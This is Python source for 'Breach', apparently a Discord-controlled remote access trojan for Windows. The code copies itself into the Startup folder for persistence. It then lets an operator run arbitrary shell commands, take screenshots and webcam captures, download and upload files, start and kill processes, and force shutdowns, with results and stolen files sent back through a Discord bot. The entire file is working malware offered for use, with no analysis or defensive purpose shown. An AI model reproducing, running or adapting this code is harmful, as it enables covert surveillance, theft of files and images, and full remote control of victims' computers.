import discord
from discord.ext import commands
import subprocess
import os
import cv2
import mss
import sys
import shutil

try:
    startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = sys.executable
    exe_name = os.path.basename(exe_path)
    destination = os.path.join(startup_folder, exe_name)

    if not os.path.exists(destination):
        shutil.copyfile(exe_path, destination)
        subprocess.Popen(destination, shell=True)
except:
    pass

if os.path.abspath(os.path.dirname(exe_path)) != os.path.abspath(startup_folder):
    sys.exit(0)

listCommand = """
```
  [>] List of Command :

- Download NAME : downloads a file from the client.
- Upload NAME : uploads a file to the client.
- Start NAME : runs a program or file on the client.
- Kill PID or NAME : terminates a process by name or ID.
- Restart : restarts the client.
- Stop : shuts down the client.
- Change : switches to another active client.
- ListID : shows the list of connected clients.
- Cam NUMBER : aptures an image from the specified webcam (start at 0).
- Screen NUMBER : captures the display of the specified screen (start at 1).
- mkdir-del-move-ren : creates, deletes, moves, or renames a file or folder.
- Dir : lists files and folders in the current directory.
- Ipconfig : shows the client's network configuration.
- Ping IP_ADDRESS : checks connectivity to an IP address.
- Systeminfo : displays system information from the client.
- Tasklit : lists currently running processes.
- Help : displays available commands.
- Any CMD command : executes any valid Windows command.
```
"""

Breach = """
```
▀█████████▄     ▄████████    ▄████████    ▄████████  ▄████████    ▄█    █▄    
  ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
  ███    ███   ███    ███   ███    █▀    ███    ███ ███    █▀    ███    ███   
 ▄███▄▄▄██▀   ▄███▄▄▄▄██▀  ▄███▄▄▄       ███    ███ ███         ▄███▄▄▄▄███▄▄ 
▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀███████████ ███        ▀▀███▀▀▀▀███▀  
  ███    ██▄ ▀███████████   ███    █▄    ███    ███ ███    █▄    ███    ███   
  ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
▄█████████▀    ███    ███   ██████████   ███    █▀  ████████▀    ███    █▀    
               ███    ███                                                     
```
  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach

"""

savepath = os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Microsoft")
cwd = os.getcwd()

TOKEN = "DISCORD_TOKEN"
intents = discord.Intents.default()
intents.message_content = True

client = commands.Bot(command_prefix=".", intents=intents, help_command=None)

@client.event
async def on_ready():
    activity = discord.CustomActivity(name="👋 Привет 👋")
    await client.change_presence(status=discord.Status.idle, activity=activity)
    for guild in client.guilds:

        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                await channel.send(Breach)
                break 

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    await client.process_commands(message)

@client.command()
async def help(ctx):
    await ctx.send(listCommand)

@client.command()
async def cd(ctx, *, path: str):
    global cwd
    if os.path.exists(path.strip()):
        cwd = path
        await ctx.send(f"[>] New directory : {path}")
    else:
        await ctx.send(f"[>] The directory name is invalid.")

@client.command()
async def screen(ctx, *, screenNum: int):
    try:
        screen_path = os.path.join(savepath, "capturescreen.png")
        with mss.mss() as sct:
            mss.tools.to_png(sct.grab(sct.monitors[screenNum]).rgb, sct.grab(sct.monitors[screenNum]).size, output=screen_path)
        
        await ctx.send("Here is your file : ", file=discord.File(screen_path))

        os.remove(screen_path)
    except: 
        await ctx.send(f"[>] This screen doesn't exist.")

@client.command()
async def cam(ctx, *, camNum: int):
    try:
        cam_path = os.path.join(savepath, "capturecam.png")
        cap = cv2.VideoCapture(camNum)
        if not cap.isOpened():
            await ctx.send(f"[>] This cam doesn't exist.")
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            await ctx.send(f"[>] This cam doesn't exist.")
            return

        cv2.imwrite(cam_path, frame)

        await ctx.send("Here is your file : ", file=discord.File(cam_path))

        os.remove(cam_path)
    except: 
        await ctx.send(f"[>] This cam doesn't exist.")

@client.command()
async def download(ctx, *, filename: str):
    file_path = os.path.join(cwd, filename.strip()) 

    if os.path.isfile(file_path):
        await ctx.send("Voici ton fichier :", file=discord.File(file_path))

    else:
        await ctx.send("Bonjour !")

@client.command()
async def upload(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("[>] Aucun fichier attaché.")
        return

    attachment = ctx.message.attachments[0]
    file_path = os.path.join(cwd, attachment.filename)

    try:
        await attachment.save(file_path)
        await ctx.send(f"[>] Fichier téléchargé : {attachment.filename}")
    except Exception as e:
        await ctx.send(f"[>] Erreur lors du téléchargement : {e}")

@client.command()
async def kill(ctx, *, arg):
    arg = arg.strip()
    try:
        number = int(arg)
        response = subprocess.run("taskkill /F /PID " + arg, shell=True, capture_output=True, text=True, encoding="cp437")
    except ValueError:
        response = subprocess.run("taskkill /F /IM " + arg, shell=True, capture_output=True, text=True, encoding="cp437")

    if response.returncode == 0 :
        output = response.stdout
        await ctx.send(output)
    else:
        await ctx.send("  [>] This process does not exist")

@client.command()
async def start(ctx, *, filename: str):
    file_path = os.path.join(cwd, filename.strip()) 
    if os.path.isfile(file_path):
        try:
            subprocess.Popen(file_path, shell=True, cwd=cwd, encoding="cp437")
            await ctx.send("  [>] File has been executed.")
        except Exception as e:
            await ctx.send(f"  [>] Failed to execute: {str(e)}")
    else:
        await ctx.send("  [>] This file does not exist.")

@client.command()
async def shutdown(ctx):
    await ctx.send("  [>] Shutting down...")
    subprocess.run("shutdown /s /f /t 0", shell=True, capture_output=True, text=True, encoding="cp437")

@client.command()
async def restart(ctx):
    await ctx.send("  [>] Restarting...")
    subprocess.run("shutdown /r /f /t 0", shell=True, capture_output=True, text=True, encoding="cp437")

@client.command()
async def cmd(ctx, *, commands: str):
    try:
        response = subprocess.run(
            commands,
            shell=True,
            capture_output=True,
            text=True,
            encoding='cp437',
            cwd=cwd
        )

        if response.returncode == 0:
            output = response.stdout

        chunk_size = 1900
        for i in range(0, len(output), chunk_size):
            await ctx.send(f"```{output[i:i+chunk_size]}```")

        if not output:
            await ctx.send("[>] No output from command.")

    except Exception as e:
        await ctx.send(f"[>] Command error:\n{str(e)}")

client.run(TOKEN)